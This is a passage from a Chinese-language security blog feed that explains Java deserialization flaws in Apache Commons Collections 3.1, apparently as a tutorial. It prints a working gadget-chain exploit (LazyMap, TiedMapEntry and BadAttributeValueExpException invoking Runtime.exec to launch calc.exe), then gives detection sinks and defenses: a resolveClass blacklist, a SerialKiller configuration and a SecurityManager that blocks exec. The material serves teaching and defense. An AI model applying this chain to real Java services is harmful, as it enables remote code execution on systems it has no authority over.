class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LazyMap测试代码，在get一个不存在的key的时候执行一个方法来生成Key值，下面的代码运行结果会调用transform()输出”Mi1k7ea”：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map targetMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), <span class="keyword">new</span> Transformer() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(targetMap.get(<span class="string">"hhhhhhhh"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TiedMapEntry——调用toString()方法触发getValue()方法（即LazyMap.get()）</strong></p><p>TiedMapEntry也存在于Commons-collections 3.1，该类主要的作用是将一个Map绑定到Map.Entry下，形成一个映射。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot set value to this map entry"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.map.put(<span class="keyword">this</span>.key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> var10000;</span><br><span class="line">            label43: &#123;</span><br><span class="line">                label29: &#123;</span><br><span class="line">                    Entry other = (Entry)obj;</span><br><span class="line">                    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getKey() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label29;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.key.equals(other.getKey())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label29;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (other.getValue() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label43;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value.equals(other.getValue())) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label43;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var10000 = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">return</span> var10000;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10000 = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> var10000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析下这个类，首先是toString()中调用了getValue()，而getValue()中实际是map.get(key)，如此一来就构建起了整个调用链接了。</p><h3 id="构造过程小结"><a href="#构造过程小结" class="headerlink" title="构造过程小结"></a>构造过程小结</h3><p><strong>BadAttributeValueExpException</strong></p><p>这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了：</p><p><img src="/2019/02/06/Java反序列化漏洞/5.png" alt="demo3"></p><p><strong>最终构造的代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(<span class="keyword">new</span> HashMap(), transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用反射的方式来向对象传参</span></span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">        test t = <span class="keyword">new</span> test();</span><br><span class="line">        t.deserialize(t.serialize(val));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，弹出计算器：</p><p><img src="/2019/02/06/Java反序列化漏洞/3.png" alt="demo3"></p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>全局搜索ObjectInputStream类，检查是否调用readObject()方法，若存在该方法则检查其是否进行了重写，若重写了readObject()方法则需严格排查是否可构造反射链来执行任意命令。</p><p>当然，结合其他几个类型的Java反序列漏洞，全局搜索的类方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="1、重写ObjectInputStream的resolveClass-，设置黑白名单机制"><a href="#1、重写ObjectInputStream的resolveClass-，设置黑白名单机制" class="headerlink" title="1、重写ObjectInputStream的resolveClass()，设置黑白名单机制"></a>1、重写ObjectInputStream的resolveClass()，设置黑白名单机制</h3><p>最常见的方法，就是在ObjectInputStream中设置黑白名单机制的方式进行防御。下面就在Apache Commons Collections反序列化漏洞示例代码中直接添加防御代码。</p><p>写一个SecureObjectInputStream类，继承于ObjectInputStream，重写resolveClass()方法实现黑名单机制过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecureObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SecureObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Only deserialize instances of our expected Bicycle class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(BadAttributeValueExpException.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"触发黑名单机制，禁止反序列化恶意类对象"</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着只需在调用代码中将ObjectInputStream替换为SecureObjectInputStream来创建ObjectInputStream对象。再次运行时发现，触发黑名单机制，无法进行反序列化漏洞的利用：</p><p><img src="/2019/02/06/Java反序列化漏洞/6.png" alt="demo3"></p><h3 id="2、利用SerialKiller-jar"><a href="#2、利用SerialKiller-jar" class="headerlink" title="2、利用SerialKiller.jar"></a>2、利用SerialKiller.jar</h3><p>原理和上面是一样的，只是已经是成熟的轮子了可以直接使用。具体的参考<a href="https://github.com/ikkisoft/SerialKiller" target="_blank" rel="noopener">https://github.com/ikkisoft/SerialKiller</a></p><p>创建sk.conf配置文件在本地项目根目录中，其中只设置了黑名单过滤BadAttributeValueExpException：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">profiling</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mode</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">logging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">logging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*BadAttributeValueExpException$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将SerialKiller.jar添加进Java项目中，并将其替换掉ObjectInputStream来创建ObjectInputStream对象。运行后发现，黑名单过滤了BadAttributeValueExpException类并抛出错误无法往下执行：</p><p><img src="/2019/02/06/Java反序列化漏洞/7.png" alt="demo3"></p><h3 id="3、禁止JVM执行外部命令Runtime-exec"><a href="#3、禁止JVM执行外部命令Runtime-exec" class="headerlink" title="3、禁止JVM执行外部命令Runtime.exec"></a>3、禁止JVM执行外部命令Runtime.exec</h3><p>通过扩展SecurityManager可以实现，这里添加一个函数，在进行反序列化操作之前调用即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">noSerial</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (originalSecurityManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建自己的SecurityManager</span></span><br><span class="line">        SecurityManager sm = <span class="keyword">new</span> SecurityManager() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 禁止exec</span></span><br><span class="line">                <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.io.FilePermission) &#123;</span><br><span class="line">                    String actions = perm.getActions();</span><br><span class="line">                    <span class="keyword">if</span> (actions != <span class="keyword">null</span> &amp;&amp; actions.contains(<span class="string">"execute"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"execute denied!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 禁止设置新的SecurityManager，保护自己</span></span><br><span class="line">                <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.lang.RuntimePermission) &#123;</span><br><span class="line">                    String name = perm.getName();</span><br><span class="line">                    <span class="keyword">if</span> (name != <span class="keyword">null</span> &amp;&amp; name.contains(<span class="string">"setSecurityManager"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"System.setSecurityManager denied!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                check(perm);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm, Object context)</span> </span>&#123;</span><br><span class="line">                check(perm);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        System.setSecurityManager(sm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将创建ObjectInputStream对象的语句换回原来的ObjectInputStream类，在反序列化之前调用前面定义的函数noSerial()，运行发现，无报错，也没有弹出计算器，即防御成功：</p><p><img src="/2019/02/06/Java反序列化漏洞/8.png" alt="demo3"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/vuls/170344.html" target="_blank" rel="noopener">Java反序列化漏洞的原理分析</a></p><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">Java反序列化漏洞从入门到深入</a></p><p><a href="https://www.cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">Java反序列化漏洞分析</a></p><p><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">浅析Java序列化和反序列化</a></p><p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在学习Java反序列化漏洞之前，建议先熟悉&lt;a href=&quot;https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
</feed>
